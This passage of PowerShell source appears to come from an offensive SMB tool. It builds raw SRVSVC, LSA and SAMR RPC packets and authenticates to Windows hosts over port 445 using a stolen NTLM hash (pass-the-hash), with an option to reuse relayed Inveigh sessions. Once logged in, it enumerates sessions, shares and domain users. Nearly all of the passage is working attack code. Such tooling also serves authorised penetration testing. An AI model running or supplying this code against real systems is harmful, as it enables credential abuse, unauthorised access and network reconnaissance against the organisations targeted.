        $packet_RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
        $packet_RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    return $packet_RPCBind
}

function New-PacketRPCRequest
{
    param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_data)

    if($packet_auth_length -gt 0)
    {
        $packet_full_auth_length = $packet_auth_length + $packet_auth_padding + 8
    }

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_data.Length)
    [Byte[]]$packet_frag_length = $packet_write_length[0,1]
    [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length + $packet_data.Length)
    [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)
    $packet_auth_length = $packet_auth_length[0,1]

    $packet_RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCRequest.Add("Version",[Byte[]](0x05))
    $packet_RPCRequest.Add("VersionMinor",[Byte[]](0x00))
    $packet_RPCRequest.Add("PacketType",[Byte[]](0x00))
    $packet_RPCRequest.Add("PacketFlags",$packet_flags)
    $packet_RPCRequest.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCRequest.Add("FragLength",$packet_frag_length)
    $packet_RPCRequest.Add("AuthLength",$packet_auth_length)
    $packet_RPCRequest.Add("CallID",$packet_call_ID)
    $packet_RPCRequest.Add("AllocHint",$packet_alloc_hint)
    $packet_RPCRequest.Add("ContextID",$packet_context_ID)
    $packet_RPCRequest.Add("Opnum",$packet_opnum)

    if($packet_data.Length)
    {
        $packet_RPCRequest.Add("Data",$packet_data)
    }

    return $packet_RPCRequest
}

function New-PacketSRVSVCNetSessEnum
{
    param([String]$packet_target)

    [Byte[]]$packet_server_UNC = [System.Text.Encoding]::Unicode.GetBytes($packet_target)

    [String]$packet_server_UNC_padding_check = $packet_target.Length / 4
       
    if($packet_target.Length % 2)
    {
        $packet_server_UNC += 0x00,0x00
    }
    else
    {
        $packet_server_UNC += 0x00,0x00,0x00,0x00
    }

    [Byte[]]$packet_MaxCount = [System.BitConverter]::GetBytes($packet_target.Length + 1)

    $packet_SRVSVCNetSessEnum = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SRVSVCNetSessEnum.Add("PointerToServerUNC_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToServerUNC_MaxCount",$packet_MaxCount)
    $packet_SRVSVCNetSessEnum.Add("PointerToServerUNC_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToServerUNC_ActualCount",$packet_MaxCount)
    $packet_SRVSVCNetSessEnum.Add("PointerToServerUNC_ServerUNC",$packet_server_UNC)
    $packet_SRVSVCNetSessEnum.Add("PointerToClient_ReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToClient_MaxCount",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToClient_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToClient_ActualCount",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToClient_Client",[Byte[]](0x00,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToUser",[Byte[]](0x00,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToUser_ReferentID",[Byte[]](0x08,0x00,0x02,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToUser_MaxCount",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToUser_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToUser_ActualCount",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToUser_User",[Byte[]](0x00,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToLevel",[Byte[]](0x00,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToLevel_Level",[Byte[]](0x0a,0x00,0x00,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToCtr_NetSessCtr_Ctr",[Byte[]](0x0a,0x00,0x00,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToCtr_NetSessCtr_PointerToCtr10_ReferentID",[Byte[]](0x0c,0x00,0x02,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToCtr_NetSessCtr_PointerToCtr10_Ctr10_Count",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToCtr_NetSessCtr_PointerToCtr10_Ctr10_NullPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SRVSVCNetSessEnum.Add("MaxBuffer",[Byte[]](0xff,0xff,0xff,0xff))
    $packet_SRVSVCNetSessEnum.Add("PointerToResumeHandle_ReferentID",[Byte[]](0x10,0x00,0x02,0x00))
    $packet_SRVSVCNetSessEnum.Add("PointerToResumeHandle_ResumeHandle",[Byte[]](0x00,0x00,0x00,0x00))

    return $packet_SRVSVCNetSessEnum
}

# LSA
function New-PacketLSAOpenPolicy
{
    param([String]$packet_target)

    $packet_LSAOpenPolicy = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_LSAOpenPolicy.Add("PointerToSystemName_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_LSAOpenPolicy.Add("PointerToSystemName_System",[Byte[]](0x5c,0x00))
    $packet_LSAOpenPolicy.Add("PointerToSystemName_Unknown",[Byte[]](0x00,0x00))
    $packet_LSAOpenPolicy.Add("PointerToAttr_Attr_Len",[Byte[]](0x18,0x00,0x00,0x00))
    $packet_LSAOpenPolicy.Add("PointerToAttr_Attr_NullPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_LSAOpenPolicy.Add("PointerToAttr_Attr_NullPointer2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_LSAOpenPolicy.Add("PointerToAttr_Attr_Attributes",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_LSAOpenPolicy.Add("PointerToAttr_Attr_NullPointer3",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_ReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $packet_LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_Qos_Len",[Byte[]](0x0c,0x00,0x00,0x00))
    $packet_LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_ImpersonationLevel",[Byte[]](0x02,0x00))
    $packet_LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_ContextMode",[Byte[]](0x01))
    $packet_LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_EffectiveOnly",[Byte[]](0x00))
    $packet_LSAOpenPolicy.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))

    return $packet_LSAOpenPolicy
}

function New-PacketLSAQueryInfoPolicy
{
    param([Byte[]]$packet_policy_handle)

    $packet_LSAQueryInfoPolicy = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_LSAQueryInfoPolicy.Add("PointerToHandle",$packet_policy_handle)
    $packet_LSAQueryInfoPolicy.Add("Level",[Byte[]](0x05,0x00))

    return $packet_LSAQueryInfoPolicy
}

function New-PacketLSAClose
{
    param([Byte[]]$packet_policy_handle)

    $packet_LSAClose = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_LSAClose.Add("PointerToHandle",$packet_policy_handle)

    return $packet_LSAClose
}

# SAMR

function New-PacketSAMRConnect5
{
    param([String]$packet_target)

    $SMB_path = "\\" + $packet_target
    [Byte[]]$packet_system_name = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
    [Byte[]]$packet_max_count = [System.BitConverter]::GetBytes($SMB_path.Length + 1)

    if($SMB_path.Length % 2)
    {
        $packet_system_name += 0x00,0x00
    }
    else
    {
        $packet_system_name += 0x00,0x00,0x00,0x00
    }

    $packet_SAMRConnect5 = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SAMRConnect5.Add("PointerToSystemName_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_SAMRConnect5.Add("PointerToSystemName_MaxCount",$packet_max_count)
    $packet_SAMRConnect5.Add("PointerToSystemName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SAMRConnect5.Add("PointerToSystemName_ActualCount",$packet_max_count)
    $packet_SAMRConnect5.Add("PointerToSystemName_SystemName",$packet_system_name)
    $packet_SAMRConnect5.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $packet_SAMRConnect5.Add("LevelIn",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SAMRConnect5.Add("PointerToInfoIn_SAMRConnectInfo_InfoIn",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SAMRConnect5.Add("PointerToInfoIn_SAMRConnectInfo_InfoIn1_ClientVersion",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_SAMRConnect5.Add("PointerToInfoIn_SAMRConnectInfo_InfoIn1_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

    return $packet_SAMRConnect5
}


function New-PacketSAMROpenDomain
{
    param([Byte[]]$packet_connect_handle,[Byte[]]$packet_sid)

    $packet_SAMROpenDomain = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SAMROpenDomain.Add("PointerToConnectHandle",$packet_connect_handle)
    $packet_SAMROpenDomain.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $packet_SAMROpenDomain.Add("PointerToSid_Count",[Byte[]](0x04,0x00,0x00,0x00))
    $packet_SAMROpenDomain.Add("PointerToSid_Sid",$packet_sid)

    return $packet_SAMROpenDomain
}

function New-PacketSAMREnumDomainUsers
{
    param([Byte[]]$packet_domain_handle)

    $packet_SAMROpenDomain = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SAMROpenDomain.Add("PointerToDomainHandle",$packet_domain_handle)
    $packet_SAMROpenDomain.Add("PointerToResumeHandle",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SAMROpenDomain.Add("AcctFlags",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_SAMROpenDomain.Add("MaxSize",[Byte[]](0xff,0xff,0x00,0x00))

    return $packet_SAMROpenDomain
}

function New-PacketSRVSVCNetShareEnumAll
{
    param([String]$packet_target)

    $SMB_path = "\\" + $packet_target
    [Byte[]]$packet_server_UNC = [System.Text.Encoding]::Unicode.GetBytes($packet_target)

    if($SMB_path.Length % 2)
    {
        $packet_server_UNC += 0x00,0x00
    }
    else
    {
        $packet_server_UNC += 0x00,0x00,0x00,0x00
    }

    [Byte[]]$packet_max_count = [System.BitConverter]::GetBytes($packet_target.Length + 1)

    $packet_SRVSVCNetShareEnum = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SRVSVCNetShareEnum.Add("PointerToServerUNC_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_SRVSVCNetShareEnum.Add("PointerToServerUNC_MaxCount",$packet_max_count)
    $packet_SRVSVCNetShareEnum.Add("PointerToServerUNC_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SRVSVCNetShareEnum.Add("PointerToServerUNC_ActualCount",$packet_max_count)
    $packet_SRVSVCNetShareEnum.Add("PointerToServerUNC_ServerUNC",$packet_server_UNC)
    $packet_SRVSVCNetShareEnum.Add("PointerToLevel_Level",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SRVSVCNetShareEnum.Add("PointerToCtr_NetShareCtr_Ctr",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SRVSVCNetShareEnum.Add("PointerToCtr_NetShareCtr_Pointer_ReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $packet_SRVSVCNetShareEnum.Add("PointerToCtr_NetShareCtr_Pointer_Ctr1_Count",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SRVSVCNetShareEnum.Add("PointerToCtr_NetShareCtr_Pointer_NullPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SRVSVCNetShareEnum.Add("MaxBuffer",[Byte[]](0xff,0xff,0xff,0xff))
    $packet_SRVSVCNetShareEnum.Add("ReferentID",[Byte[]](0x08,0x00,0x02,0x00))
    $packet_SRVSVCNetShareEnum.Add("ResumeHandle",[Byte[]](0x00,0x00,0x00,0x00))

    return $packet_SRVSVCNetShareEnum
}

function DataLength2
{
    param ([Int]$length_start,[Byte[]]$string_extract_data)

    $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)

    return $string_length
}

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

if($PSBoundParameters.ContainsKey('Session'))
{
    $inveigh_session = $true
}

if($PSBoundParameters.ContainsKey('Session'))
{

    if(!$Inveigh)
    {
        Write-Output "[-] Inveigh Relay session not found"
        $startup_error = $true
    }
    elseif(!$inveigh.session_socket_table[$session].Connected)
    {
        Write-Output "[-] Inveigh Relay session not connected"
        $startup_error = $true
    }

    $Target = $inveigh.session_socket_table[$session].Client.RemoteEndpoint.Address.IPaddressToString
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
[Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

if(!$inveigh_session)
{
    $SMB_client = New-Object System.Net.Sockets.TCPClient
    $SMB_client.Client.ReceiveTimeout = 5000
}

if(!$startup_error -and !$inveigh_session)
{

    try
    {
        $SMB_client.Connect($Target,"445")
    }
    catch
    {
        Write-Output "[-] $Target did not respond"
    }

}

if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$session].Connected))
{
    $SMB_client_receive = New-Object System.Byte[] 81920

    if(!$inveigh_session)
    {
        $SMB_client_stream = $SMB_client.GetStream()
        $SMB_client_stage = 'NegotiateSMB'

        while($SMB_client_stage -ne 'exit')
        {
            
            switch ($SMB_client_stage)
            {

                'NegotiateSMB'
                {          
                    $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID_bytes 0x00,0x00       
                    $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()    
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    if([System.BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42')
                    {
                        $SMB_version = 'SMB1'
                        $SMB_client_stage = 'NTLMSSPNegotiate'

                        if([System.BitConverter]::ToString($SMB_client_receive[39]) -eq '0f')
                        {

                            if($SigningCheck)
                            {
                                Write-Output "[+] SMB signing is required"
                                $SMB_client_stage = 'exit'
                            }
                            else
                            {    
                                Write-Verbose "[+] SMB signing is required"
                                $SMB_signing = $true
                                $SMB_session_key_length = 0x00,0x00
                                $SMB_negotiate_flags = 0x15,0x82,0x08,0xa0
                            }

                        }
                        else
                        {

                            if($SigningCheck)
                            {
                                Write-Output "[+] SMB signing is not required"
                                $SMB_client_stage = 'exit'
                            }
                            else
                            {    
                                $SMB_signing = $false
                                $SMB_session_key_length = 0x00,0x00
                                $SMB_negotiate_flags = 0x05,0x82,0x08,0xa0
                            }

                        }

                    }
                    else
                    {
                        $SMB_client_stage = 'NegotiateSMB2'

                        if([System.BitConverter]::ToString($SMB_client_receive[70]) -eq '03')
                        {

                            if($SigningCheck)
                            {
                                Write-Output "[+] SMB signing is required"
                                $SMB_client_stage = 'exit'
                            }
                            else
                            {    
                                Write-Verbose "[+] SMB signing is required"
                                $SMB_signing = $true
                                $SMB_session_key_length = 0x00,0x00
                                $SMB_negotiate_flags = 0x15,0x82,0x08,0xa0
                            }

                        }
                        else
                        {

                            if($SigningCheck)
                            {
                                Write-Output "[+] SMB signing is not required"
                                $SMB_client_stage = 'exit'
                            }
                            else
                            {    
                                $SMB_signing = $false
                                $SMB_session_key_length = 0x00,0x00
                                $SMB_negotiate_flags = 0x05,0x80,0x08,0xa0
                            }

                        }

                    }

                }

                'NegotiateSMB2'
                {
                    $SMB2_tree_ID = 0x00,0x00,0x00,0x00
                    $SMB_session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                    $SMB2_message_ID = 1
                    $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()    
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    $SMB_client_stage = 'NTLMSSPNegotiate'
                }
                    
                'NTLMSSPNegotiate'
                { 
                    
                    if($SMB_version -eq 'SMB1')
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID_bytes 0x00,0x00

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                        }

                        $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $SMB_negotiate_flags
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                        $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                    }
                    else
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                        $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $SMB_negotiate_flags 0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                        $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                    }

                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()    
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    $SMB_client_stage = 'exit'
                }
                
            }

        }

        if(!$SigningCheck)
        {
            $SMB_NTLMSSP = [System.BitConverter]::ToString($SMB_client_receive)
            $SMB_NTLMSSP = $SMB_NTLMSSP -replace "-",""
            $SMB_NTLMSSP_index = $SMB_NTLMSSP.IndexOf("4E544C4D53535000")
            $SMB_NTLMSSP_bytes_index = $SMB_NTLMSSP_index / 2
            $SMB_domain_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 12) $SMB_client_receive
            $SMB_target_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 40) $SMB_client_receive
            $SMB_session_ID = $SMB_client_receive[44..51]
            $SMB_NTLM_challenge = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 24)..($SMB_NTLMSSP_bytes_index + 31)]
            $SMB_target_details = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]
            $SMB_target_time_bytes = $SMB_target_details[($SMB_target_details.Length - 12)..($SMB_target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (Get-ChildItem -path env:computername).Value
            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
            $auth_domain_length = $auth_domain_length[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
            $auth_domain_length = $auth_domain_length[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)
            $auth_username_length = $auth_username_length[0,1]
            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)
            $auth_hostname_length = $auth_hostname_length[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $SMB_target_time_bytes +
                                    $client_challenge_bytes +
                                    0x00,0x00,0x00,0x00 +
                                    $SMB_target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $SMB_NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

            if($SMB_signing)
            {
                $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
                $session_key = $session_base_key
                $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
                $HMAC_SHA256.key = $session_key
            }

            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)
            $NTLMv2_response_length = $NTLMv2_response_length[0,1]
            $SMB_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $SMB_session_key_length +
                                    $SMB_session_key_length +
                                    $SMB_session_key_offset +
                                    $SMB_negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            if($SMB_version -eq 'SMB1')
            {
                $SMB_user_ID = $SMB_client_receive[32,33]
                $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID_bytes $SMB_user_ID

                if($SMB_signing)
                {
                    $packet_SMB_header["Flags2"] = 0x05,0x48
                }

                $packet_SMB_header["UserID"] = $SMB_user_ID
                $packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      
                $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }
            else
            {
                $SMB2_message_ID++
                $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x01,0x00 $SMB2_message_ID  $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
                $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
            }

            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
            $SMB_client_stream.Flush()
            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

            if($SMB_version -eq 'SMB1')
            {

                if([System.BitConverter]::ToString($SMB_client_receive[9..12]) -eq '00-00-00-00')
                {
                    Write-Verbose "[+] $output_username successfully authenticated on $Target"
                    $login_successful = $true
                }
                else
                {
                    Write-Output "[-] $output_username failed to authenticate on $Target"
                    $login_successful = $false
                }

            }
            else
            {
                if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -eq '00-00-00-00')
                {
                    Write-Verbose "[+] $output_username successfully authenticated on $Target"
                    $login_successful = $true
                }
                else
                {
                    Write-Output "[-] $output_username failed to authenticate on $Target"
                    $login_successful = $false
                }

            }

        }

    }

    if($login_successful -or $inveigh_session)
    {

        if($inveigh_session)
        {

            if($inveigh_session -and $inveigh.session_lock_table[$session] -eq 'locked')
            {
                Write-Output "[*] Pausing due to Inveigh Relay session lock"
                Start-Sleep -s 2
            }

            $inveigh.session_lock_table[$session] = 'locked'
            $SMB_client = $inveigh.session_socket_table[$session]
            $SMB_client_stream = $SMB_client.GetStream()
            $SMB_session_ID = $inveigh.session_table[$session]
            $SMB2_message_ID =  $inveigh.session_message_ID_table[$session]
            $SMB2_tree_ID = 0x00,0x00,0x00,0x00
        }

